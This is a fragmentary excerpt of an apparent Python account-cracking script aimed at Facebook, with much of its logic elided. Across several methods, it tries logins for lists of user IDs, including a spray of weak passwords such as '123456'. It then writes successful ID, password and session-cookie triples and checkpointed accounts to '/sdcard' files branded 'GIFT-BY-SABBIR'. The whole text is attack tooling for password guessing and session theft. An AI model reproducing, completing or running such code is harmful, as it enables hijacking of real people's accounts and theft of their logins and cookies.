...
#-_-_-_-_-_-_-_-<-FILE-M1->-_-_-_-_-_-_-_-#
    ...
    'viewport-width': '980',
                ...
                if "session_key" in po:
                    ...
                    linex()
                    open('/sdcard/GIFT-BY-SABBIR-FILE-M1-OK.txt','a').write(ids+'/'+pas+'/'+cookies+'\n')
                    self.oks.append(ids)
                    break
                    ...
                    linex()
                    open('/sdcard/GIFT-BY-SABBIR-FILE-M1-CP.txt','a').write(ids+'/'+pas+'\n')
                    self.cps.append(ids)
                    break
                else:continue
    	    self.loop += 1
...
#-_-_-_-_-_-_-_-<-FILE-M2->-_-_-_-_-_-_-_-#
    ...
    'viewport-width': '980',
                ...
                if "session_key" in po:
                    ...
                    print(f"\r\r{vb}{G}/{W}>{Y}SABBIR-CP{W}< {vcv}{Y} "+ids+f"{G} / {Y}"+pas+"\033[1;97m")
                    linex()
                    open('/sdcard/GIFT-BY-SABBIR-FILE-M2-CP.txt','a').write(ids+'/'+pas+'\n')
                    self.cps.append(ids)
                    break
                else:continue
    	    self.loop += 1
    ...
    'viewport-width': '980',
                ...
                if "session_key" in po:
                    ...
                    if "Live" in response:
                        ...
                        print(f"{vb}{G}/{W}>{B}COKIE-X{W}< {vcv}{P} "+cookies)
                        linex()
                        open('/sdcard/GIFT-BY-SABBIR-RANDOM-M1-OK.txt','a').write(str(uid)+'/'+pas+'/'+cookies+'\n')
                    ...
                    linex()
                    open('/sdcard/GIFT-BY-SABBIR-RANDOM-M1-CP.txt','a').write(str(uid)+'/'+pas+'\n')
    ...
    'viewport-width': '980',
                ...
                if "session_key" in po:
                    ...
                    if "Live" in response:
                        ...
                        print(f"{vb}{G}/{W}>{B}COKIE-X{W}< {vcv}{P} "+cookies)
                        linex()
                        open('/sdcard/GIFT-BY-SABBIR-RANDOM-M2-OK.txt','a').write(str(uid)+'/'+pas+'/'+cookies+'\n')
                        self.oks.append(str(uid))
                        break
                elif 'www.facebook.com' in po['error']['message']:
                    uid = po['error']['error_data']['uid']
                    print(f"\r\r{vb}{G}/{W}>{Y}SABBIR-CP{W}< {vcv}{Y} {str(uid)} {G}/{Y} {pas}")
                    linex()
                    open('/sdcard/GIFT-BY-SABBIR-RANDOM-M2-CP.txt','a').write(str(uid)+'/'+pas+'\n')
                    self.cps.append(str(uid))
                    break
                else:continue
            self.loop += 1
    	...
    	try:
    	    ...
    	    for pas in ["123456","1234567","12345678","123456789","123123","143143"]:
                ...
                if "session_key" in po:
                    ...
                    open('/sdcard/GIFT-BY-SABBIR-OLD-CP.txt','a').write(ids+'/'+pas+'\n')
                    self.cps.append(ids)
                    break
                else:continue
    	    self.loop += 1
